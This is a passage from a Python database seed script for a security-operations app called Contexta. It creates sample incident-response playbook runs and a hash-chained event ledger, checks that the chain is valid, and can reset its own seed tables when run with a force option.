                {"step_id": 2, "name": "Collect memory dump", "status": "escalated", "result": "Step exceeded 30 minute timeout. Escalated to SOC lead."},
            ],
        },
        {
            "playbook_id": "lateral_movement",
            "incident_idx": 17,
            "status": ExecutionStatusEnum.pending,
            "current_step": 0,
            "started_at": _ago(days=1),
            "completed_at": None,
            "step_results": [],
        },
    ]

    executions = []
    for ed in executions_data:
        inc = inc_by_idx[ed["incident_idx"]]
        pe = PlaybookExecution(
            id=str(uuid.uuid4()),
            playbook_id=ed["playbook_id"],
            incident_id=inc.id,
            status=ed["status"],
            current_step=ed["current_step"],
            step_results=ed["step_results"],
            started_at=ed["started_at"],
            completed_at=ed["completed_at"],
        )
        session.add(pe)
        executions.append(pe)
    await session.flush()
    print(f"[+] Seeded {len(executions)} playbook executions")
    return executions


async def seed_ledger(session, topology, incidents, executions):
    chain: list[LedgerBlock] = []

    def append_block(event_type, entity_id, payload):
        prev_hash = chain[-1].block_hash if chain else "0" * 64
        now = NOW - timedelta(seconds=len(chain) * (-1))
        created_at = NOW + timedelta(milliseconds=len(chain))
        block_hash = _compute_hash(prev_hash, payload, created_at)
        block = LedgerBlock(
            block_hash=block_hash,
            prev_hash=prev_hash,
            event_type=event_type,
            entity_id=str(entity_id) if entity_id else None,
            payload=payload,
        )
        block.created_at = created_at
        session.add(block)
        chain.append(block)

    # 1. Topology seeded
    append_block(
        "topology_modified",
        topology.id,
        {"action": "topology_seeded", "node_count": 12, "edge_count": 15},
    )

    # 2. One block per incident in chronological order
    sorted_incidents = sorted(incidents, key=lambda i: i.created_at)
    for inc in sorted_incidents:
        append_block(
            "incident_created",
            inc.id,
            {"incident_id": inc.id, "severity": inc.severity.value, "title": inc.title},
        )

    # 3. One block per playbook execution (triggered)
    for ex in executions:
        append_block(
            "playbook_triggered",
            ex.incident_id,
            {"playbook_id": ex.playbook_id, "incident_id": ex.incident_id, "status": "triggered"},
        )

    # 4. Completed playbook blocks (executions 0 and 1 = completed)
    for ex in executions[:2]:
        steps_done = len([s for s in ex.step_results if s.get("status") == "completed"])
        append_block(
            "playbook_completed",
            ex.incident_id,
            {"playbook_id": ex.playbook_id, "steps_completed": steps_done, "status": "completed"},
        )

    # 5. Escalated playbook block (execution 3 = escalated)
    esc_ex = executions[3]
    append_block(
        "playbook_escalated",
        esc_ex.incident_id,
        {"playbook_id": esc_ex.playbook_id, "step_failed": 2, "reason": "timeout"},
    )

    # 6. CVE ingested summary block
    append_block(
        "cve_ingested",
        None,
        {"count": 15, "source": ["manual_seed"], "timestamp": NOW.isoformat()},
    )

    await session.flush()

    # Verify
    for i, block in enumerate(chain):
        if i == 0:
            expected_prev = "0" * 64
        else:
            expected_prev = chain[i - 1].block_hash
        assert block.prev_hash == expected_prev, f"Block {i}: prev_hash mismatch"
        expected_hash = _compute_hash(block.prev_hash, block.payload, block.created_at)
        assert block.block_hash == expected_hash, f"Block {i}: hash mismatch"

    print(f"[+] Seeded {len(chain)} ledger blocks")
    print(f"[✓] Ledger chain verified — {len(chain)} blocks, all hashes valid")
    return chain


async def verify_only():
    """Load the existing ledger from DB and verify it."""
    from app.ledger.chain import BlockchainLedger

    async with async_session_factory() as session:
        ledger = BlockchainLedger()
        await ledger.load_from_db(session)
        result = await ledger.verify_chain()
        if result["valid"]:
            print(f"[✓] Ledger chain valid — {result['block_count']} blocks")
        else:
            print(f"[✗] Ledger chain INVALID at block {result['first_invalid_block']} — {result['block_count']} total blocks")
        return result["valid"]


async def force_clean(session):
    """Delete all seeded entity types in reverse dependency order."""
    await session.execute(delete(LedgerBlock))
    await session.execute(delete(PlaybookExecution))
    await session.execute(delete(Incident))
    await session.execute(delete(CVE))
    await session.execute(delete(Asset))
    await session.execute(delete(NetworkTopology))
    await session.commit()
    print("[!] Cleared all existing seed data")


async def main():
    force = "--force" in sys.argv
    verify = "--verify-only" in sys.argv

    if verify:
        valid = await verify_only()
        sys.exit(0 if valid else 1)

    try:
        async with async_session_factory() as session:
            # Idempotency check
            count = (await session.execute(select(func.count(Asset.id)))).scalar() or 0
            if count > 0 and not force:
                print("Database already seeded. Use --force to reseed.")
                return

            if force:
                await force_clean(session)

            topology = await seed_topology(session)
            await session.commit()

            assets = await seed_assets(session)
            await session.commit()

            incidents = await seed_incidents(session, assets)
            await session.commit()

            cves = await seed_cves(session)
            await session.commit()

            executions = await seed_playbook_executions(session, incidents)
            await session.commit()

            ledger_blocks = await seed_ledger(session, topology, incidents, executions)
            await session.commit()

            print()
            print("=" * 40)
            print("  Contexta seed complete")
            print("=" * 40)
            print(f"  Network topologies : 1")
            print(f"  Assets             : {len(assets)}")
            print(f"  Incidents          : {len(incidents)}")
            print(f"  CVEs               : {len(cves)}")
            print(f"  Playbook runs      : {len(executions)}")
            print(f"  Ledger blocks      : {len(ledger_blocks)}")
            print(f"  Chain valid        : YES")
            print("=" * 40)

    except ProgrammingError as e:
        print(f"\n[ERROR] Database tables do not exist.\n"
              f"Run Alembic migrations first, or set ALEMBIC_AUTO_MIGRATE=true.\n"
              f"Detail: {e}")
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
